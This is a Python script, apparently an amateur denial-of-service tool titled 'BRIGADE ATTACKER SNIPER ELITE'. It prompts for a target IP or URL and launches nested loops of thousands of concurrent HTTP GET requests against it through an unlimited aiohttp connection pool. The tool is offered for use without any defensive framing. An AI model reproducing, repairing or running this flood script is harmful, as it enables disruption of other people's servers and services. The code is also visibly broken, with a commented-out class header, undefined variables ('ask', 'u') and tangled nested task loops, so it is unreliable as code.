#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import aiohttp
import asyncio
import colorama
import random
import string 
import time
import os
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')


# Colorclass bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ZA1 = '\033[31m'
    ZA2 = '\033[32m'
    ZA3 = '\033[33m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ZH = '\033[97m'
os.system("clear")
print(" ") 
print("\033[33m      ® ® ® ® @      @ @ @        @ @ @   @ @ @ @ @   \033[0m")
print("\033[33m      ®        ®   @       @    @         @           \033[0m")
print("\033[33m      ®        ®  @         @   @         @           \033[0m")
print("\033[33m      ®        ®  @         @   @         @           \033[0m")
print("\033[96m      ®        ®  @         @   @         @           \033[0m")
print("\033[96m      ®  @ @ ®    @         @   @         @ © @ @     \033[0m")
print("\033[96m      ®        @  @ @ @ @ @ @     @ @ @   @           \033[0m")
print("\033[91m      ®        ®  @         ®          @  @           \033[0m")
print("\033[91m      ®        ®  @         @          @  @           \033[0m")
print("\033[91m      ® ® @ @ @   @         @    @ @ @    @ @ @ @ @   \033[0m")
print("\033[91m                                                      \033[0m")
print("\033[33m                                      @ @      @ @    \033[0m")
print("\033[33m                                    @     @  @     @  \033[0m")
print("\033[33m                                    @     @  @     @  \033[0m")
print("\033[92m                                    @     @  @     @  \033[0m")
print("\033[92m                                      @ @ @    @ @ @  \033[0m") 
print("\033[92m                                          @        @  \033[0m") 
print("\033[92m                                       @ @     @ @    \033[0m") 
print(" ")                                                 
print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")
print("\033[33m⁵            BRIGADE  ATTACKER  SNIPER ELITE                  ⁵\033[0m")
print("\033[33m⁵                                                             ⁵\033[0m")
print("\033[33m⁵                    Design By Za'99                          ⁵\033[0m")
print("\033[33m⁵                                                             ⁵\033[0m")
print("\033[33m⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵~ BIRRUH BIDDAM NAFDIKA YA AQSHA ~⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵⁵\033[0m")
print("\033[96m----------------------------------------------------------\033[0m")
url = input("\033[92mIP/URL: \033[0m").strip()
url = input(ask)
async def increment_view_count(session):
    try:
        async with session.get(url) as response:
            if response.status == 200:
                print("\033[92m[\033[1m+\033[92m]\033[31mSentPING: " +str(u)+ "\033[96mRequest-status " +url+ "\033[0m" )
            else:
                print("Failed ping.")
    except aiohttp.ClientError as e:
        print("\033[92m[\033[1m+\033[92mAn error occurred:\033[0m", e)

async def main():
    connector = aiohttp.TCPConnector(limit=None) # Enable connection pooling
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(19999):  # Increase the number of concurrent requests
            task = asyncio.create_task(increment_view_count(session))
            tasks.append(task)
            for i in range(19999):  # Increase the number of concurrent requests
                task = asyncio.create_task(increment_view_count(session))
                tasks.append(task)
            await asyncio.gather(*tasks)
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())


